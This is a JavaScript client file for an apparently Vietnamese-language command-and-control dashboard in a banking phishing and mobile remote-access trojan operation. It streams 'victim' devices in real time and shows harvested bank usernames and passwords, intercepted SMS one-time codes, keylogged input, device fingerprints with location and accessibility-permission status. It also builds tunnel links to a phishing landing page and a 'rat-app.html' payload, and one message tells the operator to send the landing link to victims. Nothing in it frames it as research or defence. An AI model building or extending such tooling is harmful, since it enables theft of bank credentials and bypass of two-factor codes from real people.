// ============================================================
// RANK 3: C2 DASHBOARD — Client Script (v2.0)
// Real-time monitoring via WebSocket
// ============================================================

let ws = null;
let allCredentials = [];
let allFingerprints = [];

// ==========================================
//  INIT
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    connectWebSocket();
    loadInitialData();
});

// ==========================================
//  WebSocket
// ==========================================
function connectWebSocket() {
    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${protocol}//${location.host}/ws/dashboard`);

    ws.onopen = () => {
        const el = document.getElementById('wsStatus');
        if (el) { el.textContent = '🟢 Connected'; el.style.color = '#10b981'; }
    };

    ws.onclose = () => {
        const el = document.getElementById('wsStatus');
        if (el) { el.textContent = '🔴 Disconnected'; el.style.color = '#ef4444'; }
        setTimeout(connectWebSocket, 3000);
    };

    ws.onmessage = (e) => {
        try {
            const data = JSON.parse(e.data);
            handleWsMessage(data);
        } catch (err) {}
    };
}

function handleWsMessage(data) {
    switch (data.type) {
        case 'tunnel':
            updateTunnel(data.url, data.status);
            break;
        case 'victim_updated':
            refreshVictims();
            refreshStats();
            addFeedItem('connection', `📱 ${data.data.device?.device_name || data.data.id} — ${data.data.status}`);
            break;
        case 'victim_status':
            refreshVictims();
            refreshStats();
            addFeedItem('connection', `📱 ${data.victim_id} → ${data.status}`);
            break;
        case 'new_credentials':
            addCredentialRow(data.data, data.victim_id);
            refreshStats();
            addFeedItem('harvest', `🎣 ${data.data.bank} — ${data.data.username} : ${data.data.password}`);
            break;
        case 'new_sms':
            addCredentialOtp(data.victim_id, data.data);
            refreshStats();
            addFeedItem('sms', `🔐 OTP: ${data.data.otp} (${data.data.bank})`);
            break;
        case 'new_keylog':
            addFeedItem('c2', `⌨️ [${data.keylog.field}] ${data.keylog.value}`);
            break;
        case 'new_fingerprint':
            addFingerprintRow(data.data);
            refreshStats();
            addFeedItem('connection', `📲 Fingerprint: ${data.data.device?.device_name || 'Unknown'}`);
            break;
        case 'new_log':
            addFeedItem(data.data.type, data.data.details);
            break;
        case 'data_cleared':
            loadInitialData();
            break;
    }
}

// ==========================================
//  Load Initial Data
// ==========================================
async function loadInitialData() {
    try {
        const [statsRes, victimsRes, fpRes, logsRes, tunnelRes] = await Promise.all([
            fetch('/api/stats').then(r => r.json()),
            fetch('/api/victims').then(r => r.json()),
            fetch('/api/fingerprints').then(r => r.json()),
            fetch('/api/logs').then(r => r.json()),
            fetch('/api/tunnel').then(r => r.json())
        ]);

        // Stats
        updateStatsUI(statsRes);

        // Tunnel
        updateTunnel(tunnelRes.url, tunnelRes.status);

        // Victims
        renderVictimsList(victimsRes);

        // Credentials from victims
        allCredentials = [];
        const credsBody = document.getElementById('credsBody');
        if (credsBody) credsBody.innerHTML = '';
        victimsRes.forEach(v => {
            (v.credentials || []).forEach(c => {
                addCredentialRow(c, v.id);
            });
        });
        if (allCredentials.length === 0 && credsBody) {
            credsBody.innerHTML = '<tr><td colspan="6" class="empty-cell">Chưa có credentials</td></tr>';
        }

        // Fingerprints
        const fpBody = document.getElementById('fpBody');
        if (fpBody) fpBody.innerHTML = '';
        allFingerprints = [];
        (fpRes.entries || []).slice(0, 50).forEach(fp => {
            addFingerprintRow(fp);
        });
        if (allFingerprints.length === 0 && fpBody) {
            fpBody.innerHTML = '<tr><td colspan="6" class="empty-cell">Chưa có fingerprint</td></tr>';
        }

        // Logs -> Feed
        const feedEl = document.getElementById('liveFeed');
        if (feedEl) feedEl.innerHTML = '';
        (logsRes || []).slice(0, 50).forEach(log => {
            addFeedItem(log.type, log.details, log.timestamp);
        });

    } catch (err) {
        console.error('Load error:', err);
    }
}

// ==========================================
//  Stats
// ==========================================
function updateStatsUI(stats) {
    setText('statVictims', stats.total_victims || 0);
    setText('statOnline', stats.online_victims || 0);
    setText('statCreds', stats.total_credentials || 0);
    setText('statOtp', stats.total_sms_otp || 0);
    setText('statAccess', stats.accessibility_granted || 0);
    setText('statFingerprints', stats.total_fingerprints || 0);
}

async function refreshStats() {
    try {
        const stats = await fetch('/api/stats').then(r => r.json());
        updateStatsUI(stats);
    } catch(e) {}
}

// ==========================================
//  Tunnel
// ==========================================
function updateTunnel(url, status) {
    const urlEl = document.getElementById('tunnelUrl');
    const linksEl = document.getElementById('tunnelLinks');
    const iconEl = document.getElementById('tunnelIcon');

    if (status === 'connected' && url) {
        if (urlEl) urlEl.textContent = url;
        if (iconEl) iconEl.textContent = '✅';
        if (linksEl) linksEl.style.display = 'block';
        setText('linkLanding', url + '/mobile');
        setText('linkRat', url + '/mobile/rat-app.html');
    } else if (status === 'failed') {
        if (urlEl) { urlEl.textContent = 'Tunnel thất bại'; urlEl.style.color = '#ef4444'; }
        if (iconEl) iconEl.textContent = '❌';
    } else {
        if (urlEl) urlEl.textContent = 'Đang khởi tạo...';
        if (iconEl) iconEl.textContent = '⏳';
    }
}

// ==========================================
//  Victims List
// ==========================================
async function refreshVictims() {
    try {
        const victims = await fetch('/api/victims').then(r => r.json());
        renderVictimsList(victims);
    } catch(e) {}
}

function renderVictimsList(victims) {
    const container = document.getElementById('victimsList');
    if (!container) return;

    if (!victims || victims.length === 0) {
        container.innerHTML = '<div class="empty-state">Chưa có thiết bị nào kết nối. Gửi link landing page cho nạn nhân.</div>';
        return;
    }

    container.innerHTML = victims.map(v => {
        const dev = v.device || {};
        const isOnline = v.status === 'online';
        const hasAcc = v.accessibility_granted;
        const credCount = (v.credentials || []).length;
        const smsCount = (v.intercepted_sms || []).length;

        return `
            <div class="victim-card ${isOnline ? 'online' : 'offline'}">
                <div class="victim-avatar">${isOnline ? '📱' : '📴'}</div>
                <div class="victim-info">
                    <div class="victim-name">${dev.device_name || v.id}</div>
                    <div class="victim-meta">${dev.os || ''} ${dev.os_version || ''} · ${dev.browser || ''} · ${dev.screen || ''}</div>
                    <div class="victim-meta">🎣 ${credCount} creds · 🔐 ${smsCount} OTP · ${isOnline ? '🟢 Online' : '⚫ Offline'}</div>
                </div>
                ${hasAcc ? '<span class="victim-badge acc">Accessibility ✓</span>' : '<span class="victim-badge">No Access</span>'}
            </div>
        `;
    }).join('');
}

// ==========================================
//  Credentials Table
// ==========================================
function addCredentialRow(cred, victimId) {
    const tbody = document.getElementById('credsBody');
    if (!tbody) return;

    // Remove empty state
    const emptyCell = tbody.querySelector('.empty-cell');
    if (emptyCell) emptyCell.closest('tr').remove();

    const existingId = `cred_${victimId}_${cred.bank}_${cred.username}`;
    allCredentials.push({ ...cred, victim_id: victimId });

    const tr = document.createElement('tr');
    tr.id = existingId;
    tr.innerHTML = `
        <td>${formatTime(cred.timestamp)}</td>
        <td>${victimId.substr(0, 12)}...</td>
        <td><strong>${cred.bank || '—'}</strong></td>
        <td><span class="cred-value">${cred.username || '—'}</span></td>
        <td><span class="cred-value">${cred.password || '—'}</span></td>
        <td><span class="cred-value" id="otp_${existingId}">${cred.otp || '⏳ chờ...'}</span></td>
    `;

    // Insert at top
    if (tbody.firstChild) {
        tbody.insertBefore(tr, tbody.firstChild);
    } else {
        tbody.appendChild(tr);
    }
}

function addCredentialOtp(victimId, smsData) {
    // Find matching credential row and update OTP
    const rows = document.querySelectorAll('#credsBody tr');
    for (const row of rows) {
        const otpCell = row.querySelector('[id^="otp_"]');
        if (otpCell && row.id && row.id.includes(victimId)) {
            if (otpCell.textContent === '⏳ chờ...') {
                otpCell.textContent = smsData.otp;
                otpCell.style.color = '#10b981';
                otpCell.style.fontWeight = '700';
                break;
            }
        }
    }
}

// ==========================================
//  Fingerprints Table
// ==========================================
function addFingerprintRow(fp) {
    const tbody = document.getElementById('fpBody');
    if (!tbody) return;

    const emptyCell = tbody.querySelector('.empty-cell');
    if (emptyCell) emptyCell.closest('tr').remove();

    allFingerprints.push(fp);

    const dev = fp.device || {};
    const loc = fp.location || {};

    const tr = document.createElement('tr');
    tr.innerHTML = `
        <td>${formatTime(fp.received_at)}</td>
        <td>${dev.device_name || 'Unknown'}</td>
        <td>${dev.os || '?'} ${dev.os_version || ''}</td>
        <td>${dev.browser || '?'}</td>
        <td>${dev.screen || '?'}</td>
        <td>${loc.city ? loc.city + ', ' + loc.country : (loc.error || 'N/A')}</td>
    `;

    if (tbody.firstChild) {
        tbody.insertBefore(tr, tbody.firstChild);
    } else {
        tbody.appendChild(tr);
    }
}

// ==========================================
//  Live Feed
// ==========================================
function addFeedItem(type, details, timestamp) {
    const feed = document.getElementById('liveFeed');
    if (!feed) return;

    const emptyState = feed.querySelector('.empty-state');
    if (emptyState) emptyState.remove();

    const typeClass = type === 'harvest' ? 'harvest' :
                      type === 'connection' ? 'connection' :
                      type === 'permission' ? 'permission' :
                      type === 'sms_otp' || type === 'sms' ? 'sms' : 'c2';

    const typeLabel = {
        harvest: 'HARVEST', connection: 'CONNECT', permission: 'PERMISSION',
        sms_otp: 'SMS OTP', sms: 'SMS OTP', c2_command: 'C2', c2: 'C2',
        infection: 'CONNECT', keylog: 'KEYLOG'
    }[type] || type.toUpperCase();

    const div = document.createElement('div');
    div.className = 'feed-item';
    div.innerHTML = `
        <span class="feed-time">${formatTime(timestamp || new Date().toISOString())}</span>
        <span class="feed-type ${typeClass}">[${typeLabel}]</span>
        <span class="feed-detail">${details}</span>
    `;

    feed.insertBefore(div, feed.firstChild);

    // Keep max 100 items
    while (feed.children.length > 100) {
        feed.removeChild(feed.lastChild);
    }
}

// ==========================================
//  Actions
// ==========================================
async function clearAllData() {
    if (!confirm('Xóa toàn bộ dữ liệu thu hoạch?')) return;
    try {
        await fetch('/api/data', { method: 'DELETE' });
        loadInitialData();
    } catch(e) {}
}

function copyLink(elementId) {
    const el = document.getElementById(elementId);
    if (!el) return;
    const text = el.textContent;
    navigator.clipboard.writeText(text).then(() => {
        const btn = el.nextElementSibling;
        if (btn) { btn.textContent = '✅'; setTimeout(() => btn.textContent = '📋', 1500); }
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = text; document.body.appendChild(ta);
        ta.select(); document.execCommand('copy');
        document.body.removeChild(ta);
    });
}

// ==========================================
//  Utilities
// ==========================================
function setText(id, text) {
    const el = document.getElementById(id);
    if (el) el.textContent = text;
}

function formatTime(isoStr) {
    if (!isoStr) return '—';
    try {
        const d = new Date(isoStr);
        return d.toLocaleTimeString('vi-VN', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    } catch(e) { return isoStr; }
}
